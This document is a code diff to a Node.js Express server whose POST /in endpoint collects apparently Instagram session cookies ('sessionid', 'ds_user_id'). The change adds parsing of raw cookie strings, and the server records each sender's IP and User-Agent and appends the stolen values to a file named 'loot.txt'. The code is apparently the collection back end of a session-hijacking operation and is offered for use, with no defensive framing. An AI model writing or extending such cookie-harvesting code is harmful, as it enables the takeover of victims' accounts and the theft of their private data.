@@ -17,7 +17,21 @@ app.use((req, res, next) => {
 
 // POST /in endpointi
 app.post("/in", (req, res) => {
-  const { sessionid, ds_user_id } = req.body;
+  // Gelen istekte ya doğrudan sessionid ve ds_user_id varsa al
+  // Yoksa cookies stringi parçala
+  let sessionid = req.body.sessionid;
+  let ds_user_id = req.body.ds_user_id;
+
+  if (!sessionid && req.body.cookies) {
+    const lines = req.body.cookies.split('; ').reduce((acc, kv) => {
+      const [k, v] = kv.split('=');
+      if (k === 'sessionid') acc.sessionid = v;
+      if (k === 'ds_user_id') acc.ds_user_id = v;
+      return acc;
+    }, {});
+    sessionid = sessionid || lines.sessionid;
+    ds_user_id = ds_user_id || lines.ds_user_id;
+  }
 
   if (!sessionid) {
     console.log("POST /in: sessionid yoxdur");
@@ -32,7 +46,7 @@ app.post("/in", (req, res) => {
     ip,
     ua: req.get("User-Agent"),
     sessionid,
-    ds_user_id,
+    ds_user_id
   };
 
   // loot.txt faylına əlavə et (Render-da fayl sistemi ephemeral ola bilər)
